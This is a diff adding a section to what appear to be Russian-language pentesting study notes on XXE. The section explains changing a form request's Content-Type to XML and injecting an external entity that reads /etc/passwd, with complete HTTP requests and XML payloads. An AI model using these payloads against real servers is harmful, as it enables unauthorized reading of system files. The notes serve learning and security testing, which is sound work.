@@ -213,6 +213,80 @@ XXE позволяет делать запросы к любым URL (SSRF) [](
 
 -----
 -----
+
+### Атаки XXE с помощью измененного типа контента
+## MIME-SHIFTING
+
+Eсли сайт тупо парсит тело запроса, не проверяя `Content-Type`, то можешь "переобуть" его из обычной формы в XML и поймать XXE.
+
+---
+
+главная суть:
+
+ориг запрос:
+```http
+POST / HTTP/1.1
+Content-Type: application/x-www-form-urlencoded
+
+productId=1&storeId=2
+```
+
+пробую подменить тип (рассчитывая что сервер принимает  XML и парсит тело как XML)
+
+```http
+POST / HTTP/1.1
+Content-Type: text/xml
+
+<?xml version="1.0"?>
+<stockCheck>
+  <productId>1</productId>
+  <storeId>2</storeId>
+</stockCheck>
+```
+
+и если все работает как и прежде - признак наличия возможной уязвимости!
+
+и можно пробовать вставлять XXE
+```http
+POST / HTTP/1.1
+Content-Type: text/xml
+
+<?xml version="1.0"?>
+<!DOCTYPE foo [ <!ENTITY xxe SYSTEM "file:///etc/passwd"> ]>
+<stockCheck>
+  <productId>&xxe;</productId>
+  <storeId>2</storeId>
+</stockCheck>
+```
+
+---
+
+еще пример:
+
+**Базовый запрос:**
+```xml
+<?xml version="1.0"?>
+<request>
+  <param1>value1</param1>
+  <param2>value2</param2>
+</request>
+```
+
+**С XXE:**
+```xml
+<?xml version="1.0"?>
+<!DOCTYPE request [
+  <!ENTITY xxe SYSTEM "file:///etc/passwd">
+]>
+<request>
+  <param1>&xxe;</param1>
+  <param2>value2</param2>
+</request>
+```
+
+
+
+
 ------
 
 
@@ -407,3 +481,7 @@ XML-схемы (`*.xsd`) — это тоже XML. Они могут импорт
 Обход фильтров, доступ к нестандартным источникам данных
 
 -----------
+
+
+
+
